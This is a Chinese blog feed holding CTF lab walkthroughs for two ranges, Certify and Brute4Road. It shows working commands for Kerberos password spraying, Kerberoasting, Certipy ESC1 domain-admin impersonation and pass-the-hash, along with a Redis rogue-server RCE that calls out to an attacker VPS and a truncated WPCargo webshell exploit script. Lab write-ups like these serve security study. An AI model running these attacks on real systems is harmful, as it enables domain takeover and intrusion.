___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>start infoscan(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span>      is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">19</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">26</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">47</span>     is alive<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><span class="hljs-number">172.22.9.7:139</span> open<span class="hljs-number">172.22.9.47:21</span> open<span class="hljs-number">172.22.9.26:135</span> open<span class="hljs-number">172.22.9.19:22</span> open<span class="hljs-number">172.22.9.47:139</span> open<span class="hljs-number">172.22.9.26:139</span> open<span class="hljs-number">172.22.9.7:135</span> open<span class="hljs-number">172.22.9.47:80</span> open<span class="hljs-number">172.22.9.7:80</span> open<span class="hljs-number">172.22.9.47:22</span> open<span class="hljs-number">172.22.9.19:80</span> open<span class="hljs-number">172.22.9.26:445</span> open<span class="hljs-number">172.22.9.7:445</span> open<span class="hljs-number">172.22.9.19:8983</span> open<span class="hljs-number">172.22.9.47:445</span> open<span class="hljs-number">172.22.9.7:88</span> open<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">16</span>start vulscan<span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">26</span>   <span class="hljs-string">[-&gt;]</span>DESKTOP-CBKTVMO   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">26</span><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">26</span>     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span> <span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span>      <span class="hljs-string">[+]</span>DC XIAORANG\XIAORANG-DC     <span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span>   <span class="hljs-string">[-&gt;]</span>XIAORANG-DC   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">47</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">10918</span>  title:Apache2 Ubuntu Default Page: It works<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">47</span>     fileserver                          Windows <span class="hljs-number">6</span>.<span class="hljs-number">1</span> <span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">19</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">612</span>    title:Welcome to nginx!<span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">47</span>  (Windows <span class="hljs-number">6</span>.<span class="hljs-number">1</span>)<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">19</span>:<span class="hljs-number">8983</span>   code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">19</span>:<span class="hljs-number">8983</span>/solr/<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span>         code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">19</span>:<span class="hljs-number">8983</span>/solr/ code:<span class="hljs-number">200</span> len:<span class="hljs-number">16555</span>  title:Solr Admin<span class="hljs-string">[+]</span> http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span> poc-yaml-active-directory-certsrv-detect</code></pre></div><div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.9.7</span> # DC XIAORANG\XIAORANG-DC  <span class="hljs-number">172.22.9.19</span> #本机<span class="hljs-number">172.22.9.26</span> # DESKTOP-CBKTVMO.xiaorang.lab<span class="hljs-number">172.22.9.47</span> # Ubuntu fileserver</code></pre></div><p>看fileserver</p><div class="code-wrapper"><pre><code class="hljs gherkin">D:\CTF-tool\network\fscan1.8.2&gt;fscan64 -h 172.22.9.47 -np   ___                              _  / _ \     ___  ___ _ __ __ _  ___|<span class="hljs-string"> </span>|<span class="hljs-string"> __</span><span class="hljs-string"> / /_\/____/ __</span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> &#x27;__/ _` </span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ /</span><span class="hljs-string">/ /_\\_____\__ \ (__</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string">   &lt;</span><span class="hljs-string">\____/     </span>|<span class="hljs-string">___/\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">  \__,_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">\_\</span><span class="hljs-string">                     fscan version: 1.8.2</span><span class="hljs-string">start infoscan</span><span class="hljs-string">172.22.9.47:22 open</span><span class="hljs-string">172.22.9.47:21 open</span><span class="hljs-string">172.22.9.47:80 open</span><span class="hljs-string">172.22.9.47:445 open</span><span class="hljs-string">172.22.9.47:139 open</span><span class="hljs-string">[*] alive ports len is: 5</span><span class="hljs-string">start vulscan</span><span class="hljs-string">[*] WebTitle: http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><span class="hljs-string">[*] 172.22.9.47  (Windows 6.1)</span><span class="hljs-string">[*] NetBios: 172.22.9.47     fileserver                          Windows 6.1</span><span class="hljs-string">已完成 4/5 [-] ftp://172.22.9.47:21 ftp ftp123 530 Login incorrect.</span><span class="hljs-string">^C</span><span class="hljs-string"></span><span class="hljs-string">D:\CTF-tool\network\fscan1.8.2&gt;fscan64 -h 172.22.9.47 -np -m smb</span><span class="hljs-string"></span><span class="hljs-string">   ___                              _</span><span class="hljs-string">  / _ \     ___  ___ _ __ __ _  ___</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> __</span><span class="hljs-string"> / /_\/____/ __</span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> &#x27;__/ _` </span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ /</span><span class="hljs-string">/ /_\\_____\__ \ (__</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string">   &lt;</span><span class="hljs-string">\____/     </span>|<span class="hljs-string">___/\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">  \__,_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">\_\</span><span class="hljs-string">                     fscan version: 1.8.2</span><span class="hljs-string">-m  smb  start scan the port: 445</span><span class="hljs-string">start infoscan</span><span class="hljs-string">172.22.9.47:445 open</span><span class="hljs-string">[*] alive ports len is: 1</span><span class="hljs-string">start vulscan</span><span class="hljs-string">[+] SMB:172.22.9.47:445:administrator 123456</span><span class="hljs-string">已完成 1/1</span><span class="hljs-string">[*] 扫描结束,耗时: 434.9872ms</span></code></pre></div><p>可以扫出smb服务用户密码</p><p>但是还是直接匿名登陆算了</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> smbclient.py <span class="hljs-number">172.22.9.47</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201163733916.png" alt="image-20241201163733916"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201163826008.png" alt="image-20241201163826008"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>把personnel.db下载下来</p><div class="code-wrapper"><pre><code class="hljs 1c"><span class="hljs-meta"># get personnel.db</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201165218767.png" alt="image-20241201165218767"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201165235662.png" alt="image-20241201165235662"></p><p>经典密码喷洒</p><p>枚举了下域用户</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201165249058.png" alt="image-20241201165249058"></p><p>kerbrute只能一个一个跑。。。。</p><div class="code-wrapper"><pre><code class="hljs stylus">kerbrute_windows_amd64 passwordspray <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -d xiaorang<span class="hljs-selector-class">.lab</span> user<span class="hljs-selector-class">.txt</span> i9XDE02pLVfkerbrute_windows_amd64 passwordspray <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -d xiaorang<span class="hljs-selector-class">.lab</span> user<span class="hljs-selector-class">.txt</span> <span class="hljs-number">6</span>N70jt2K9sVkerbrute_windows_amd64 passwordspray <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -d xiaorang<span class="hljs-selector-class">.lab</span> user<span class="hljs-selector-class">.txt</span> fiAzGwEMgTY</code></pre></div><div class="code-wrapper"><pre><code class="hljs scss">zhangjian<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:i9XDE02pLVfliupeng<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:fiAzGwEMgTY</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201170256061.png" alt="image-20241201170256061"></p><p>也可以像Chu0师傅用crackmapexec跑</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201183622218.png" alt="image-20241201183622218"></p><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>服务主体名称（SPN：ServicePrincipal Names）是服务实例的唯一标识符。可以理解为域内服务的身份证，每个服务都有一个唯一的SPN，而服务在注册SPN的时候会和账号进行绑定，因此SPN起到了将服务实例与服务登录帐户相关联的作用。<strong>一个SPN对应一个账户和一个服务，但一个账户可以对应多个SPN和服务</strong></p><p>这里比较重要的是，任何一个域内账户都可以向DC查询所有域内用户对应的<strong>SPN</strong>并进行<strong>TGS交换</strong>过程，在<strong>KRB_TGS_REP</strong>过程将会返回查询到的用户的<strong>TGS tickets</strong>，然后我们即可使用爆破工具对于返回的票据进行爆破，获取对应明文。</p><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>根据flag02的提示，查一下用户的SPN</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> GetUserSPNs.py -dc-ip <span class="hljs-number">172.22.9.7</span> xiaorang.lab/zhangjian:i9XDE02pLVf</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201170440852.png" alt="image-20241201170440852"></p><p>请求zhangxia用户的TGS tickets</p><div class="code-wrapper"><pre><code class="hljs crmsh">python GetUserSPNs.py -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> xiaorang.lab/zhangjian:i9XDE02pLVf -request-<span class="hljs-keyword">user</span> <span class="hljs-title">zhangxia</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201170540630.png" alt="image-20241201170540630"></p><p>因为是在TGS REP过程，对应hashcat的参数</p><div class="code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">13100 </span>| Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP                       | Network Protocol</code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -a <span class="hljs-number">0</span> -m <span class="hljs-number">13100</span> <span class="hljs-number">1</span>.txt rockyou.txt</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201170840550.png" alt="image-20241201170840550"></p><p>查一下可以进行rdp登录</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> cme rdp -u zhangxia -p MyPass2@@<span class="hljs-number">6</span> -d xiaorang.lab <span class="hljs-number">172.22.9.0</span>/<span class="hljs-number">24</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201171213952.png" alt="image-20241201171213952"></p><p>bloodhound进行信息收集</p><h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>我之前不是说bloodhound一直卡NAN%，上传不上去</p><p>现在发现是收集器版本和bloodhound的版本不匹配</p><p>要使用对应版本的收集器</p><p><a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p><p>我当时直接apt下的直接最新版bloodhound，看了下文章</p><blockquote><p>注意：BloodHound GUI 4.1.0之后的版本以及所使用的数据采集工具都经过重构，对部分windows系统执行采集数据时兼容性较差，且4.1.0版本对应采集工具的数据结果与4.0.3版本是不通用的。</p></blockquote><p>就下载对应版本，在zip包中resources&#x2F;app&#x2F;collector下有收集器</p><p>后面看看要不要换个低版本的bloodhound吧，这次好不容易成功了</p><h3 id="继续-1"><a href="#继续-1" class="headerlink" title="继续"></a>继续</h3><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201175031383.png" alt="image-20241201175031383"></p><p>zhangxia用户对DC有<code>GenericWrite</code>权限，<code>X1r0z</code>大佬说可以配置RBCD，但我不会</p><p>CA认证服务器结合题目名，尝试查看是否存在错误配置的证书</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">certipy</span> find -u <span class="hljs-string">&quot;zhangxia<span class="hljs-variable">@xiaorang</span>.lab&quot;</span>  -password <span class="hljs-string">&quot;MyPass2@@6&quot;</span> -dc-ip <span class="hljs-number">172.22.9.7</span> -vulnerable -stdout</code></pre></div><div class="code-wrapper"><pre><code class="hljs routeros">Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 35 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 13 enabled certificate templates[!] Failed <span class="hljs-keyword">to</span> resolve: XIAORANG-DC.xiaorang.lab[*] Trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span> via CSRA[!] Got <span class="hljs-built_in">error</span> <span class="hljs-keyword">while</span> trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span> via CSRA: [Errno 11001] getaddrinfo failed[*] Trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span> via RRP[!] Got <span class="hljs-built_in">error</span> <span class="hljs-keyword">while</span> trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span> via RRP: [Errno<span class="hljs-built_in"> Connection </span><span class="hljs-built_in">error</span> (XIAORANG-DC.xiaorang.lab:445)] [Errno 11001] getaddrinfo failed[!] Failed <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span>[!] Failed <span class="hljs-keyword">to</span> resolve: XIAORANG-DC.xiaorang.lab[!] Got <span class="hljs-built_in">error</span> <span class="hljs-keyword">while</span> trying <span class="hljs-keyword">to</span> check <span class="hljs-keyword">for</span> web enrollment: [Errno 11001] getaddrinfo failed[*] Enumeration output:Certificate Authorities  0    CA Name                             : xiaorang-XIAORANG-DC-CA   <span class="hljs-built_in"> DNS </span>Name                            : XIAORANG-DC.xiaorang.lab    Certificate Subject                 : <span class="hljs-attribute">CN</span>=xiaorang-XIAORANG-DC-CA, <span class="hljs-attribute">DC</span>=xiaorang, <span class="hljs-attribute">DC</span>=lab    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5    Certificate Validity Start          : 2023-07-14 04:33:21+00:00    Certificate Validity End            : 2028-07-14 04:43:21+00:00    Web Enrollment                      : Disabled   <span class="hljs-built_in"> User </span>Specified SAN                  : Unknown    Request Disposition                 : Unknown    Enforce Encryption <span class="hljs-keyword">for</span> Requests     : UnknownCertificate Templates  0    Template Name                       : XR Manager    Display Name                        : XR Manager    Certificate Authorities             : xiaorang-XIAORANG-DC-CA    Enabled                             : <span class="hljs-literal">True</span>   <span class="hljs-built_in"> Client </span>Authentication               : <span class="hljs-literal">True</span>    Enrollment Agent                    : <span class="hljs-literal">False</span>    Any Purpose                         : <span class="hljs-literal">False</span>    Enrollee Supplies Subject           : <span class="hljs-literal">True</span>    Certificate Name Flag               : EnrolleeSuppliesSubject    Enrollment Flag                     : PublishToDs                                          IncludeSymmetricAlgorithms    Private Key Flag                    : 16777216                                          65536                                          ExportableKey    Extended Key Usage                  : Encrypting File<span class="hljs-built_in"> System</span><span class="hljs-built_in"></span>                                          Secure Email                                         <span class="hljs-built_in"> Client </span>Authentication    Requires Manager Approval           : <span class="hljs-literal">False</span>    Requires Key Archival               : <span class="hljs-literal">False</span>    Authorized Signatures Required      : 0    Validity Period                     : 1 year    Renewal Period                      : 6 weeks    Minimum RSA Key Length              : 2048    Permissions      Enrollment Permissions        Enrollment Rights               : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Domain<span class="hljs-built_in"> Users</span><span class="hljs-built_in"></span>                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Authenticated<span class="hljs-built_in"> Users</span><span class="hljs-built_in"></span>      Object Control Permissions        Owner                           : XIAORANG.LAB\Administrator        Write Owner Principals          : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Administrator        Write Dacl Principals           : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Administrator        Write Property Principals       : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Administrator    [!] Vulnerabilities      ESC1                              : <span class="hljs-string">&#x27;XIAORANG.LAB\\Domain Users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;XIAORANG.LAB\\Authenticated Users&#x27;</span> can enroll, enrollee supplies subject <span class="hljs-keyword">and</span> template allows<span class="hljs-built_in"> client </span>authentication</code></pre></div><p>下面利用 ESC1</p><p>申请 <code>XR Manager</code> 证书模版并伪造域管理员</p><p>ESC1利用条件</p><div class="code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">msPKI</span><span class="hljs-operator">-</span><span class="hljs-variable">Certificates</span><span class="hljs-operator">-</span><span class="hljs-variable">Name</span><span class="hljs-operator">-</span><span class="hljs-variable">Flag</span><span class="hljs-operator">:</span> <span class="hljs-type">ENROLLEE_SUPPLIES</span><span class="hljs-type">_SUBJECT</span>表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户<span class="hljs-variable">PkiExtendedKeyUsage</span><span class="hljs-operator">:</span> <span class="hljs-variable">Client</span> <span class="hljs-built_in">Authentication</span>表示将基于此证书模板生成的证书可用于对 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 中的计算机进行身份验证<span class="hljs-variable">Enrollment</span> <span class="hljs-variable">Rights</span><span class="hljs-operator">:</span> <span class="hljs-variable">NT</span> <span class="hljs-variable">Authority</span>\<span class="hljs-variable">Authenticated</span> <span class="hljs-variable">Users</span>表示允许 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 中任何经过身份验证的用户请求基于此证书模板生成的新证书</code></pre></div><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">certipy</span> req -u <span class="hljs-string">&quot;zhangxia<span class="hljs-variable">@xiaorang</span>.lab&quot;</span> -p <span class="hljs-string">&quot;MyPass2@@6&quot;</span> -target <span class="hljs-number">172.22.9.7</span> -dc-ip <span class="hljs-number">172.22.9.7</span> -ca <span class="hljs-string">&quot;xiaorang-XIAORANG-DC-CA&quot;</span> -template <span class="hljs-string">&quot;XR Manager&quot;</span> -upn administrator<span class="hljs-variable">@xiaorang</span>.lab</code></pre></div><p>这里遇到个问题，<code>-upn</code>前面要用两个空格，一个的话请求不了。。。。。。</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201181005314.png" alt="image-20241201181005314"></p><p>拿到administrator.pfx</p><p>最后认证，拿到ccache以及hash</p><p>拿其中一个去pass the hash即可</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">certipy</span> auth -pfx administrator.pfx -dc-ip <span class="hljs-number">172.22.9.7</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201180944250.png" alt="image-20241201180944250"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201180924027.png" alt="image-20241201180924027"></p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>最后pass the hash到172.22.9.26这台机子的administrator</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> psexec.py -hashes :<span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@<span class="hljs-number">172.22.9.26</span></code></pre></div><p>拿到flag03.txt</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify-writeup/image-20241201181215408.png" alt="image-20241201181215408"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>本期学习了certipy，CA证书配置不当导致的ECS1，以及了解spn</p><p>好像还有ECS8等，不知道是什么，后面再说</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜 Brute4Road writeup</title>
    <link href="/2024/11/29/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/"/>
    <url>/2024/11/29/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-Brute4Road-writeup"><a href="#春秋云镜-Brute4Road-writeup" class="headerlink" title="春秋云镜 Brute4Road writeup"></a>春秋云镜 Brute4Road writeup</h1><p>本来想效率高一点的，但是每天起来都下午了，再加上复现的效率较低（这还是照着wp复现的效率。。。。</p><p>现在搞得好像每天一刷一样，哈哈哈</p><p>由于重置了靶机，再加上有些结果没保存偷的结果，所以不要在意外网过程的ip变化</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫ip</p><div class="code-wrapper"><pre><code class="hljs gradle">[+] Redis:<span class="hljs-number">39.99</span>.<span class="hljs-number">130.229</span>:<span class="hljs-number">6379</span> unauthorized <span class="hljs-keyword">file</span>:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>db/<span class="hljs-keyword">dump</span>.rdb[+] ftp:<span class="hljs-comment">//39.99.130.229:21:anonymous</span>   [-&gt;]pub已完成 <span class="hljs-number">4</span>/<span class="hljs-number">4</span>[*] 扫描结束,耗时: <span class="hljs-number">36.850577042</span>s</code></pre></div><p><code>redis-cli -h ip </code>连过去能发现是5.x版本</p><p>redis主从复制rce</p><p>使用已知脚本，<code>redis-rce</code>或者<code>redis-rogue-server.py</code></p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">39.99</span>.<span class="hljs-number">149.30</span> -L vps_ip -<span class="hljs-keyword">f</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175512121.png" alt="image-20241129175512121"></p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175605325.png" alt="image-20241129175605325"></p><p>没有读取权限</p><p>查看suid提权</p><p>发现个base64，加密后再解密就行</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175646022.png" alt="image-20241129175646022"></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>然后就下载fscan，frp等工具，探测内网</p><p>先看一下ip，这里有一个问题，看了一些wp，他们说不存在ifconfig等查看ip的命令</p><p>但是我有。。。。。</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175834455.png" alt="image-20241129175834455"></p><p>fscan扫描</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175850818.png" alt="image-20241129175850818"></p><div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.2.3</span> #DC<span class="hljs-number">172.22.2.7</span> #本机<span class="hljs-number">172.22.2.16</span> # MSSQLSERVER<span class="hljs-number">172.22.2.18</span> # workgroup\ubuntu-web02<span class="hljs-number">172.22.2.34</span> # client01</code></pre></div><p>看wordpress</p><p>搭建代理</p><p>上wpscan扫描</p><p>X1r0z大佬说</p><blockquote><p>wordpress 一般都是先从插件入手, 实在不行了再去爆破用户名密码</p></blockquote><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129180318794.png" alt="image-20241129180318794"></p><p>扫出wpcargo插件存在漏洞</p><p>去官网找exp</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> requests<span class="hljs-comment"># This is a magic string that when treated as pixels and compressed using the png</span><span class="hljs-comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span>payload = <span class="hljs-string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_character_code</span>(<span class="hljs-params">c: <span class="hljs-built_in">int</span></span>):    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c).replace(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>)text = <span class="hljs-string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> binascii.unhexlify(payload)])[<span class="hljs-number">1</span>:]destination_url = <span class="hljs-string">&#x27;http://172.22.2.18/&#x27;</span>cmd = <span class="hljs-string">&#x27;ls&#x27;</span><span class="hljs-comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span>requests.get(    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span 